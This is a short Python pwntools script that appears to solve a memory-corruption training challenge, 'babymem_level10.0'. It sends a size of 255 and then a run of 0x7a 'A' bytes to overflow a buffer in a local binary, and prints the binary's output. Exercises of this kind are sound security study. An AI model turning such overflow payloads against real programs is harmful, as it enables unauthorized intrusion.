from pwn import *

p = process("/challenge/babymem_level10.0")
p.sendline(b"255")
s=b"A"*(0x7a)
p.send(s)
all = p.recvall()
p.close()
all = all.decode()
print(all)


